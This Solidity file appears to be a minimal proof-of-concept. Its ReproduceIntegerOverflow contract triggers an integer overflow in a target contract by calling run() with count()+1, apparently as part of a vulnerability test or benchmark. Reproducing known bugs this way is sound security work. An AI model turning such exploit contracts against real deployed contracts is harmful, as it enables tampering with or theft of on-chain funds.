interface IIntegerOverflowMinimal {
    function run(uint256 input) external;
    function count() external view returns (uint256);
}

contract ReproduceIntegerOverflow {
    IIntegerOverflowMinimal public target;

    constructor(address _target) {
        target = IIntegerOverflowMinimal(_target);
    }

    function triggerOverflow() public {
        uint256 overflowInput = target.count() + 1;
        target.run(overflowInput);
    }

    function getCount() public view returns (uint256) {
        return target.count();
    }
}